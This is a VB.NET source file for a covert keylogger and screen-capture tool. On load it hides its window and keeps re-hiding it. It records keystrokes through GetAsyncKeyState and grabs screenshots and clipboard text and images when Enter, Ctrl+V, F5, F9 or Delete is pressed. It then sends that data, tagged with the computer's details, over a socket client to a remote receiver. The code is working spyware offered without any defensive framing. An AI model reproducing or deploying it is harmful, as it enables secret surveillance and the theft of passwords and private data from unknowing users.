Imports System.Threading
Imports System.IO
Imports System.Drawing
Imports System.Runtime.InteropServices
Public Class Form1
    Dim buffer As New List(Of String)
    Dim buffercat As String
    Dim stagingpoint As String
    Dim actual As String
    ' threading
    Dim thread_scan As Thread
    Dim thread_control As Thread
    Dim Keylog As SocketClient.Keylog
    ' getkey, API call to USER32.DLL
    <DllImport("USER32.DLL", EntryPoint:="GetAsyncKeyState", SetLastError:=True, CharSet:=CharSet.Unicode, ExactSpelling:=True, CallingConvention:=CallingConvention.StdCall)>
    Public Shared Function getkey(ByVal Vkey As Integer) As Boolean
    End Function

    Delegate Sub SetTextCallback(ByVal [text] As String)

    ' thread safe call to output text to output box
    Private Sub SetText(ByVal [text] As String)
        If txtKeyLog.InvokeRequired Then
            Dim d As New SetTextCallback(AddressOf SetText)
            Me.Invoke(d, New Object() {[text]})
        Else
            txtKeyLog.Text = [text]
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim g As Graphics = Graphics.FromImage(screenGrab)
        g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)
        Dim obj As Image = screenGrab
        Dim filename As String = "p2_" & DateTime.Now.ToString("yyyyMMdd-HHMMss-fff") & ".jpg"
        'obj.Save(filename, Imaging.ImageFormat.Bmp)
        Dim c As New SocketClient.ClientSend
        c.Connect()
        c.SentImage(txtComputer.Text, filename, obj)
        c.Disconnect()
        obj.Dispose()
        'Me.Visible = False
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        'If (OpenFileDialog1.ShowDialog() = System.Windows.Forms.DialogResult.OK) Then
        'Dim sr As New System.IO.StreamReader(OpenFileDialog1.FileName)
        Dim c As New SocketClient.ClientSend
        Dim filename As String = "txt_" & DateTime.Now.ToString("yyyyMMdd-HHMMss-fff") & ".txt"
        c.Connect()
        c.SentText(txtComputer.Text, filename, txtKeyLog.Text) 'sr.ReadToEnd)
        c.Disconnect()
        'sr.Close()
        'End If
        'Me.Visible = False
    End Sub
    Sub getClipboard()
        Dim data As System.Windows.Forms.IDataObject = System.Windows.Forms.Clipboard.GetDataObject()
        If Not (data Is Nothing) Then
            If (data.GetDataPresent(System.Windows.Forms.DataFormats.Text)) Then
                Dim TextClipBoard As String = data.GetData(System.Windows.Forms.DataFormats.Text)
                Dim filename As String = "txtClipBoard_" & DateTime.Now.ToString("yyyyMMdd-HHMMss-fff") & ".txt"
                Dim c As New SocketClient.ClientSend
                c.Connect()
                c.SentText(txtComputer.Text, filename, TextClipBoard) 'sr.ReadToEnd)
                c.Disconnect()
            End If
            If (data.GetDataPresent(System.Windows.Forms.DataFormats.Bitmap)) Then
                Dim obj As Image = Clipboard.GetDataObject().GetData(DataFormats.Bitmap)
                Dim filename As String = "p2ClipBoard_" & DateTime.Now.ToString("yyyyMMdd-HHMMss-fff") & ".jpg"
                'obj.Save(filename, Imaging.ImageFormat.Bmp)
                Dim c As New SocketClient.ClientSend
                c.Connect()
                c.SentImage(txtComputer.Text, filename, obj)
                c.Disconnect()
                obj.Dispose()
            End If
        End If
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Keylog = New SocketClient.Keylog
        txtComputer.Text = Keylog.GetComputerInfo()
        thread_scan = New Thread(AddressOf Scan)
        thread_scan.IsBackground = True
        thread_scan.Start()
        thread_control = New Thread(AddressOf KeyControl)
        thread_control.IsBackground = True
        thread_control.SetApartmentState(System.Threading.ApartmentState.STA)
        thread_control.Start()
        Me.Visible = False
    End Sub

    ' write out keystroke log to file on close event
    Private Sub Form1_Closed(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.Closed
        thread_scan.Abort()
        thread_control.Abort()
    End Sub

    ' checks for keypresses with delay, upon detection of pressed key, calls AddToBuffer
    Public Sub Scan()
        Dim foo As Integer
        While 1
            For foo = 1 To 93 Step 1
                If getkey(foo) Then
                    Keylog.AddtoBuffer(foo, getkey(16), actual, buffer)
                End If
            Next
            For foo = 186 To 192 Step 1
                If getkey(foo) Then
                    Keylog.AddtoBuffer(foo, getkey(16), actual, buffer)
                End If
            Next
            Keylog.BufferToOutput(buffer, stagingpoint)
            buffer.Clear()
            Thread.Sleep(120)
            SetText(stagingpoint)
        End While
    End Sub
    ' thread-safe calling for thread_hide
    Delegate Sub Change()
    Dim objchange As New Change(AddressOf DoHide)
    Sub DoHide()
        If Me.Visible = True Then
            Me.Visible = False
        End If
    End Sub
    Public Sub KeyControl()
        While 1
            Me.Invoke(objchange)
            If (getkey(13)) Then
                Button2_Click(Nothing, Nothing)
                Button1_Click(Nothing, Nothing)
            ElseIf getkey(17) And getkey(86) Then
                Button1_Click(Nothing, Nothing)
                getClipboard()
            ElseIf getkey(116) Or getkey(120) Or getkey(46) Then
                Button1_Click(Nothing, Nothing)
            End If
            'backspace 8
            'TAB(9)
            'Enter(13)
            'shift 16
            'ctrl 17
            'alt 18
            'pause/break	19
            'caps lock	20
            'escape 27
            'page up	33
            'page down	34
            'end	35
            'home 36
            'left arrow	37
            'up arrow	38
            'right arrow	39
            'down arrow	40
            'insert 45
            'delete 46
            'left window key	91
            'right window key	92
            'select key	93
            'numpad 0	96
            'numpad 1	97
            'numpad 2	98
            'numpad 3	99
            'numpad 4	100
            'numpad 5	101
            'numpad 6	102
            'numpad 7	103
            'numpad 8	104
            'numpad 9	105
            'multiply	106
            'add	107
            'subtract	109
            'decimal point	110
            'divide	111
            'f1	112
            'f2	113
            'f3	114
            'f4	115
            'f5	116
            'f6	117
            'f7	118
            'f8	119
            'f9	120
            'f10	121
            'f11	122
            'f12	123
            'num lock	144
            'scroll lock	145
            'semi-colon	186
            'equal sign	187
            'comma	188
            'dash	189
            'period	190
            'forward slash	191
            'grave accent	192
            'open bracket	219
            'back slash	220
            'close braket	221
            'single quote	222
            Thread.Sleep(120)
        End While
    End Sub
End Class
